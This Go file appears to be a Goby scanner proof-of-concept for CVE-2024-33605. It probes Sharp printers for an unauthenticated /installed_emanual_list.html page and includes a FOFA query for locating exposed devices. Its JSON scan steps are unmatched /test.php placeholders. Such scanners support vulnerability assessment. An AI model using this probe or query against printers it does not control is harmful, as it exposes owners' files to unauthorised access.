package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Sharp Multifunction Printers /installed_emanual_list.html Unauthorized Access Vulnerability(CVE-2024-33605)",
    "Description": "<p>Sharp printers are vulnerable to arbitrary directory listing attacks without authentication, allowing any attacker to list any directory and retrieve any file from the printer.</p>",
    "Product": "Sharp Multifunction Printers",
    "Homepage": "http://www.sharp.co.jp/",
    "DisclosureDate": "2024-07-22",
    "PostTime": "2024-11-01",
    "Author": "2987612621@qq.com",
    "FofaQuery": "title=\"MX-\" && body=\"document.main.submit()\"",
    "GobyQuery": "title=\"MX-\" && body=\"document.main.submit()\"",
    "Level": "2",
    "Impact": "<p>Unauthorized attackers can exploit this vulnerability to access and list any directory on the printer and retrieve any file, potentially leading to sensitive information disclosure.</p>",
    "Recommendation": "<p>1.Follow the official patch release information, apply patches or upgrade to the latest version</p><p><a href=\"http://www.sharp.co.jp/\">http://www.sharp.co.jp/</a></p><p>2.It is recommended to set authentication for the printer management interface and restrict unauthorized access.</p>",
    "References": [
        "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2024/CVE-2024-33605.yaml"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        "CVE-2024-33605"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Sharp多功能打印机 /installed_emanual_list.html 未授权访问漏洞（CVE-2024-33605）",
            "Product": "Sharp多功能打印机",
            "Description": "<p>夏普打印机在没有身份验证的情况下容易受到任意目录列表的攻击，任何攻击者都可以列出打印机中的任何目录并恢复任何文件。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本&nbsp;</p><p><a href=\"http://www.sharp.co.jp/\">http://www.sharp.co.jp/</a><br></p><p>2、建议对打印机管理界面进行身份验证设置，并限制未授权的访问。</p>",
            "Impact": "<p>未经授权的攻击者可以通过此漏洞访问和列出打印机中的任何目录，并恢复任何文件，可能导致敏感信息泄露。</p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Sharp Multifunction Printers /installed_emanual_list.html Unauthorized Access Vulnerability(CVE-2024-33605)",
            "Product": "Sharp Multifunction Printers",
            "Description": "<p>Sharp printers are vulnerable to arbitrary directory listing attacks without authentication, allowing any attacker to list any directory and retrieve any file from the printer.</p>",
            "Recommendation": "<p>1.Follow the official patch release information, apply patches or upgrade to the latest version</p><p><a href=\"http://www.sharp.co.jp/\">http://www.sharp.co.jp/</a><br></p><p>2.It is recommended to set authentication for the printer management interface and restrict unauthorized access.</p>",
            "Impact": "<p>Unauthorized attackers can exploit this vulnerability to access and list any directory on the printer and retrieve any file, potentially leading to sensitive information disclosure.</p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`

sendPayloadkhy15ky8 := func(hostInfo *httpclient.FixUrl) (bool, string) {
  
  vulPath := `/installed_emanual_list.html`
  
      GetRequestConfig := httpclient.NewGetRequestConfig(vulPath)
      GetRequestConfig.VerifyTls = false
      GetRequestConfig.FollowRedirect = false
    
      //请求
      response, err := httpclient.DoHttpRequest(hostInfo, GetRequestConfig)
      if err != nil {
        return false,  vulPath
      }
    
      if strings.Contains(response.RawBody, "ServiceEmanualList") && strings.Contains(response.RawBody, "/installed_emanual_down.html") {
        return true,vulPath
      }
    
  
  return false, vulPath
}
ExpManager.AddExploit(NewExploit(
  goutils.GetFileName(),
  expJson,
  func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
    // 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
    respBool, vulPath := sendPayloadkhy15ky8(hostInfo)

    // --------------------------------------------------
    // 请注意，后续为模板内容，正常情况下无需修改
    
    if respBool {
      ss.VulURL = hostInfo.Scheme() + "://" + hostInfo.HostInfo + vulPath 
      return true
    }
    return false
  },
  func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
    // 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

    // --------------------------------------------------
    // 请注意，后续为模板内容，正常情况下无需修改
    _, vulPath := sendPayloadkhy15ky8(expResult.HostInfo)
    expResult.Output = `使用` + vulPath + `路径 进行未授权访问`  
    expResult.Success = true
    return expResult
  },
))
}